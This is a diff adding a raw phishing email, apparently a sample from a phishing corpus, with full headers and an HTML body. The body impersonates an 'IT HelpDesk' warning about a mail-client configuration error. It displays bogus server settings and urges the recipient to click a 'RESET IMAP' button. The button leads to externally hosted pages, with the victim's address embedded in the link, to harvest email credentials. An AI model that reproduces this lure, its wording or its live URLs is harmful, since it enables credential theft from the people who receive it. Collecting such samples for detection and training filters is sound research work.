@@ -1,0 +1,270 @@
+Return-Path: info@sani.lat
+Delivered-To: jose@monkey.org
+X-FDA: 83818967148.09.891433F
+Received: from srv102954.yourbestnetwork.net (sani.lat [185.221.222.183])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id CDEBD12000B
+	for <jose@monkey.org>; Tue, 26 Aug 2025 13:20:12 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=sani.lat header.s=dkim header.b=e4+7YYZv;
+	spf=pass (imf25.b.hostedemail.com: domain of info@sani.lat designates
+ 185.221.222.183 as permitted sender) smtp.mailfrom=info@sani.lat;
+	dmarc=pass (policy=reject) header.from=sani.lat
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756214413;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Ps9Ywe80sRyWIQxFbmg7KIiP52PdO3XW3yFRu++CH58=;
+	b=yhyZC9wjVVwhyD+h/HsALWcIHK3V6Y+waWpN201HttuJMkrnYkjJ4TYv98TalVU08EUyTK
+	epe+i6+rtbN07S9TsYeTOhnOZrzV/vwgyWQkL5krPim6YdihmFXYrA+l65Ee9WzyVl70ZB
+	eAO9Ur0pdSVSH7Umcz7f72NZ7kx6Tfs=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756214413; a=rsa-sha256;
+	cv=none;
+	b=jqkFpAbIzzITIqJkXPMaBniJltChjYoUaqbQs3zab7rospz48f1bX0471uK19uPHP4RRbr
+	0dUptUyadLcoQivqhj+u8rv2uY4ESWBI36ZYsxeyWgkyfTozOafUPsrw34ON0Xez8T/lbx
+	oEeg1aRhdlGgcF8US/ywIgjMTIlHmW4=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=sani.lat header.s=dkim header.b=e4+7YYZv;
+	spf=pass (imf25.b.hostedemail.com: domain of info@sani.lat designates
+ 185.221.222.183 as permitted sender) smtp.mailfrom=info@sani.lat;
+	dmarc=pass (policy=reject) header.from=sani.lat
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sani.lat;
+	 s=dkim; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
+	Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=Ps9Ywe80sRyWIQxFbmg7KIiP52PdO3XW3yFRu++CH58=; b=e4+7YYZvbZf0wcZhHOryNS44yi
+	xUelpgi/o+ZLT5LL6H0rjeBPxYzH02AFxx2dN4e8GDR0JWBt2ZFxexHHPNxNLoq1TIIGjG5Ij7Mfg
+	3bIBk1utSNjb+xSCD+ZvXB6Z/EWtAKlL1igsIiUhZ7BoeH25sogufWpXYhJ7Q+Dg4fzs=;
+Received: from [216.250.253.91]
+	by srv102954.yourbestnetwork.net with esmtpa (Exim 4.93)
+	(envelope-from <info@sani.lat>)
+	id 1uqY1D-00Aube-DF
+	for jose@monkey.org; Mon, 25 Aug 2025 14:17:55 +0000
+From: IT HelpDesk <info@sani.lat>
+To: jose@monkey.org
+Subject: Client configuration settings error for jose@monkey.org.
+Date: 25 Aug 2025 07:17:54 -0700
+Message-ID: <20250825071753.27FED4BE55725ED2@sani.lat>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-SPF-Fail: YES
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: CDEBD12000B
+X-Stat-Signature: dnfjz6pnr76mhxzzz1d3cy5c5a5ueyur
+X-Rspam-User: 
+X-Spam-Status: No, score=1.50
+X-HE-Tag: 1756214412-613165
+X-HE-Meta: 
+ U2FsdGVkX1/otIWhPnfHEMbBoo/nqxodn/4TMDAVkm+pmHg2Kxk5DTZgauegFh+/L0T80t3DhSp7hvdosO2d2/WRR5vo/QSHKgszKMFtgFUa0ROIVsGoCryd09rl/4EWnPHIm2L0xyTe0x1kMLs8KgTQir0Vc4LMTBTqXGAffpCUs0ytRQxOhc/TdwQb0gCqe2G+r4JofgK/Flv0W1jBZBJEhNJcpTMFgmzDNNtfdf9zvxFaeTqloyEmLMHD0tTiYoPSlpOg558mL9dS7WXd4OAvsTyc80flcTMF+8+dmQoo/5ZjrZNi7PZGJawNoZn2QhSlwZVqyJh6F58x/Wh9Vj4rRjvWDYppciHBpQSNC9htHiQ5j2Ocxtg2CJArZbJATiVfZGQcIDzj1nclJRSR7AAhP/ZUJFgTWjIzM4Xx7HlT0xS+Nj78pOxNXQWhEJmWDWOr9r53BxgogdpK+J2C4dUUNj6JfLxDpngXXVQ89gJfxid1Br3WGdZcQNtaf9xQHH7eNZ/4g+/HayQy7OSxe5GCTSSaDqIdkZZShS38HrijOuY0H2a+SE9y9gvJC4Z+eGHPoyQfC0ACjb9iW/AneirdAHb3xMbLcWfFeWg4XpU7gcLsQjPePwv0htAWezhlInJX0Z+4d9sjM4w8SNFzTlkyoorfa1PJjMMcIFxoA8k7Pv+CwjY0ND3zfqWy2f9bAMNOPiPhT/G/IrRTFUCS6fL3BPJq+lzEEbnb7Piqynyf6/i6H/gG4/ud54s+Fn8UviKsldHOp0g1siNBfrpChSuFjaUuvNkBFpMysdaRrmM2bP4TOAFkfFYQEm8B4wzG3ErN0Kv7y5PQSVSpnxrdcg5bsV4JO8pg801t7YuQj2m+BHHFAp7jeNokHN8VPpihVbQJRmsyUkLf5E/mhNi/5SwyXtR+GorlWkXQw2MfVbJD29QQe6S3xjaVpNU2KWOJVxUKTdvCvvdMcQgF0MIx4OKI+Wv
+ ZTfEAoweCyMNFLExqO+iPXyXUZ53jjcMvABxaFI2HFTwWwiKKLz+oWFqZ44JgI73o1p+B9cHa/0kGhTgjhiGA5t26JPosdoGke9KUBpIwSANjNuyaQXPl3GOi6Qy3m+0mitHSUbRHGZeWcKmkL7NWGy+BTiaIfg0gx3crL5+ZkN2HMf/Ugjz0FNWrEztRI/KzdDx+Qyc5TfHQW4/050TXNtcwNHG4+QrvphNz4Uay7VvbizbpZRAeMvCAPay1vtFj+Jp7vy0pSQs/YrfLUhsDAZDMlHOvALHSGV8kWFtP5EEBw/T0cQBYxoLoxWCLMijmwvl8
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 340
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div tabindex=3D"1" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" i=
+d=3D":csx" role=3D"textbox" aria-expanded=3D"false" aria-controls=3D":hrr" =
+aria-owns=3D":hrr" style=3D"direction: ltr; min-height: 334px;" contentedit=
+able=3D"true" hidefocus=3D"true" spellcheck=3D"false" aria-label=3D"Message=
+ Body" aria-multiline=3D"true" itacorner=3D"6,7:1,1,0,0" g_editable=3D"true=
+" writingsuggestions=3D"false"><div dir=3D"ltr">
+
+<table width=3D"680" style=3D"border: 0px currentColor; border-image: none;=
+ max-width: 680px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"680" height=3D"25" style=3D'color: rgb(51, 51, 51); font-famil=
+y: "Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 16px;'>Client Co=
+nfiguration settings&nbsp;error&nbsp;for "jose@monkey.org".</td></tr>
+<tr>
+<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
+ 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; ba=
+ckground-color: rgb(255, 255, 255);">
+<table width=3D"680" style=3D'background: rgb(255, 255, 255); font-family: =
+"Helvetica Neue",Helvetica,Arial,sans-serif;' border=3D"0" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"15">&nbsp;</td>
+<td width=3D"650">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td>
+<div id=3D"m_-8622352238059546852m_304797497864950399v1manual_settings_area=
+">
+<h2 id=3D"m_-8622352238059546852m_304797497864950399v1hdrManualSettings">Ma=
+il Client Manual Settings</h2>
+<div>
+<div>
+<div id=3D"m_-8622352238059546852m_304797497864950399v1ssl_settings_area" s=
+tyle=3D"border-radius: 4px; border: 1px solid rgb(66, 139, 202); border-ima=
+ge: none; margin-bottom: 20px; background-color: rgb(255, 255, 255);">
+<div style=3D"border-color: rgb(66, 139, 202); padding: 10px 15px; color: r=
+gb(255, 255, 255); border-top-left-radius: 3px; border-top-right-radius: 3p=
+x; background-color: rgb(66, 139, 202);">Secure <abbr title=3D"Secure Socke=
+ts Layer">SSL</abbr>/<abbr title=3D"Transport Layer Security">TLS</abbr> Se=
+ttings (Recommended)</div>
+<table style=3D"width: 100%; margin-bottom: 0px; border-collapse: collapse;=
+ max-width: 100%; border-spacing: 0px; background-color: transparent;">
+<tbody>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblSSLSettingsAreaUse=
+rname" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
+top-width: 1px; border-top-style: solid;">Username:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valSSLSettingsAreaUse=
+rname" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
+top-width: 1px; border-top-style: solid;">jose@monkey.org</td></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblSettingsAreaPasswo=
+rd" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top=
+-width: 1px; border-top-style: solid;">Password:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valSettingsAreaPasswo=
+rd" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top=
+-width: 1px; border-top-style: solid;">Use the email account's password.</t=
+d></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblSettingsAreaIncomi=
+ngServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bord=
+er-top-width: 1px; border-top-style: solid;">Incoming Server:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valSettingsAreaIncomi=
+ngServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bord=
+er-top-width: 1px; border-top-style: solid;">monkey.org<ul style=3D"list-st=
+yle: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px;"><li st=
+yle=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"><abbr=
+ title=3D"Internet Message Access Protocol">IMAP</abbr> Port: 993 </li>
+<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
+><abbr title=3D"Post Office Protocol 3">POP3</abbr> Port: 995 </li></ul></t=
+d></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblSettingsAreaOutgoi=
+ngServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bord=
+er-top-width: 1px; border-top-style: solid;">Outgoing Server:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valSettingsAreaOutGoi=
+ngServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bord=
+er-top-width: 1px; border-top-style: solid;">monkey.org<ul style=3D"list-st=
+yle: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px;"><li st=
+yle=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"><abbr=
+ title=3D"Simple Mail Transfer Protocol">SMTP</abbr> Port: 465 </li></ul></=
+td></tr>
+<tr>
+<td style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top=
+-width: 1px; border-top-style: solid;" colspan=3D"2">
+<div id=3D"m_-8622352238059546852m_304797497864950399v1lblSettingsAreaSmall=
+Note1">IMAP, POP3, and SMTP require authentication.</div></td></tr></tbody>=
+</table></div></div></div>
+<div id=3D"m_-8622352238059546852m_304797497864950399v1nonSSL" style=3D"dis=
+play: none;">
+<div>
+<div id=3D"m_-8622352238059546852m_304797497864950399v1non_ssl_settings_are=
+a" style=3D"border-radius: 4px; border: 1px solid rgb(246, 195, 66); border=
+-image: none; margin-bottom: 20px; background-color: rgb(255, 255, 255);">
+<div style=3D"border-color: rgb(246, 195, 66); padding: 10px 15px; color: r=
+gb(51, 51, 51); border-top-left-radius: 3px; border-top-right-radius: 3px; =
+background-color: rgb(252, 248, 225);"><span id=3D"m_-8622352238059546852m_=
+304797497864950399v1descNonSSLSettings">Non-SSL Settings (NOT Recommended)<=
+/span></div>
+<table id=3D"m_-8622352238059546852m_304797497864950399v1tblManualSettingsT=
+able" style=3D"width: 100%; margin-bottom: 0px; border-collapse: collapse; =
+max-width: 100%; border-spacing: 0px; background-color: transparent;">
+<tbody>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblNonSSLSettingsUser=
+name" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-t=
+op-width: 1px; border-top-style: solid;">Username:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valNonSSLSettingsUser=
+name" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-t=
+op-width: 1px; border-top-style: solid;"><a href=3D"mailto:info@mthreebm.co=
+m" target=3D"_blank" rel=3D"noopener">info@mthreebm.com</a></td></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblNonSSLSettingsPass=
+word" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-t=
+op-width: 1px; border-top-style: solid;">Password:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valNonSSLSettingsPass=
+word" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-t=
+op-width: 1px; border-top-style: solid;">Use the email account's password.<=
+/td></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1lblNonSSLSettingsInco=
+mingServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bo=
+rder-top-width: 1px; border-top-style: solid;">Incoming Server:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1valNonSSLSettingsInco=
+mingServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); bo=
+rder-top-width: 1px; border-top-style: solid;"><a href=3D"http://mail.mthre=
+ebm.com" target=3D"_blank" rel=3D"noopener" data-saferedirecturl=3D"https:/=
+/www.google.com/url?q=3Dhttp://mail.mthreebm.com&amp;source=3Dgmail&amp;ust=
+=3D1756189009230000&amp;usg=3DAOvVaw1jo3zBEr3d3kk3Jz0tZDc_">mail.mthreebm.c=
+om</a>=20
+<ul style=3D"list-style: none; padding-left: 0px; margin-top: 0px; margin-b=
+ottom: 10px;"><li style=3D"padding-right: 5px; padding-left: 5px; display: =
+inline-block;"><abbr title=3D"Internet Message Access Protocol">IMAP</abbr>=
+ Port: 143 </li><li style=3D"padding-right: 5px; padding-left: 5px; display=
+: inline-block;"><abbr title=3D"Post Office Protocol 3">POP3</abbr> Port: 1=
+10 </li></ul></td></tr>
+<tr>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1NonSSLSettingsOutgoin=
+gServer" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); borde=
+r-top-width: 1px; border-top-style: solid;">Outgoing Server:</td>
+<td id=3D"m_-8622352238059546852m_304797497864950399v1NonSSLSettingsOutgoin=
+gServerData" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); b=
+order-top-width: 1px; border-top-style: solid;"><a href=3D"http://mail.mthr=
+eebm.com" target=3D"_blank" rel=3D"noopener" data-saferedirecturl=3D"https:=
+//www.google.com/url?q=3Dhttp://mail.mthreebm.com&amp;source=3Dgmail&amp;us=
+t=3D1756189009230000&amp;usg=3DAOvVaw1jo3zBEr3d3kk3Jz0tZDc_">mail.mthreebm.=
+com</a>=20
+<ul style=3D"list-style: none; padding-left: 0px; margin-top: 0px; margin-b=
+ottom: 10px;"><li style=3D"padding-right: 5px; padding-left: 5px; display: =
+inline-block;"><abbr title=3D"Simple Mail Transfer Protocol">SMTP</abbr> Po=
+rt: 587 </li></ul></td></tr>
+<tr>
+<td style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top=
+-width: 1px; border-top-style: solid;" colspan=3D"2">
+<div id=3D"m_-8622352238059546852m_304797497864950399v1descNonSSLSettingsAu=
+thenticationIsRequiredForIMAPPOP3SMTP1">IMAP, POP3, and SMTP require authen=
+tication.</div></td></tr></tbody></table></div></div></div></div><p>Reset y=
+our incoming server settings to continue receiving all your&nbsp;messages.<=
+/p><table width=3D"193" style=3D"border-radius: 3px; height: 52px; font-siz=
+e: 11pt; border-collapse: collapse; background-color: rgb(215, 86, 36);" bo=
+rder=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
+30px; box-sizing: border-box;">
+<a style=3D"color: rgb(255, 255, 255); font-family: Helvetica,Arial,sans-se=
+rif; font-size: 16px; font-weight: bold; box-sizing: border-box; background=
+-color: transparent; text-decoration-line: none;" href=3D"https://pub-fcee1=
+7d5850f41d091c934ed22707e1a.r2.dev/san.html#jose@monkey.org" target=3D"_bla=
+nk" rel=3D"noopener"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://servererrorx=
+t-au8hlz1c-donaldgomez193-coder.4everland.app/Servererrorxt.html%23sales@ja=
+guarequipments.com&amp;source=3Dgmail&amp;ust=3D1756189009230000&amp;usg=3D=
+AOvVaw1zc0jTsZ_R-qF1Gky9VoKq">RESET  IMAP</a>
+</td></tr></tbody></table><p></p>
+<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;"><=
+font size=3D"4">I<span style=3D'font-family: "Segoe UI"; font-size: medium;=
+'>f after resetting your server and you still experience service disruption=
+, kindly contact&nbsp;support&nbsp;for further assistance.</span></font>&nb=
+sp;</p></td></tr>
+<tr>
+<td>
+<div style=3D'color: rgb(102, 102, 102); padding-top: 5px; font-family: "He=
+lvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px; margin-top: 5px;=
+ border-top-color: rgb(232, 232, 232); border-top-width: 2px; border-top-st=
+yle: solid;'>The system generated this notice on 8/25/2025 7:17:53 a.m.</di=
+v>
+<p>Do not reply to this automated message.</p></td></tr></tbody></table></t=
+d></tr></tbody></table></td></tr></tbody></table>
+
+<br></div>
+</div>
+</body></html>
+
